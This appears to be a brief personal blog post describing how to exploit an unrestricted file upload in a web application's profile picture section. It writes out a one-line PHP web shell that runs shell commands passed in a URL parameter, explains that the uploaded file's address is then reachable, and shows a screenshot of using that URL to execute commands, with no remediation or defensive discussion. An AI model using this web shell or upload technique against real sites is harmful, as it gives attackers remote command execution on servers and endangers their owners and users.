---
layout: post
title: unrestricted file upload
---
possible way to take advantage of an unrestricted file upload within a profile picture section in a web server

```
echo "<?php system(\$_GET['cmd']); ?>" > exploit.php
```

copy image address results in the following url being copied to our clipboard: http://www.nop.cat/admin/ftp/objects/XXXXXXXXXXXX.php

![alt text](https://github.com/nopcat/nopcat.github.io/blob/master/images/Captura%20de%20pantalla%20de%202017-11-27%2023-06-38.png? "url to execute command in webserver")
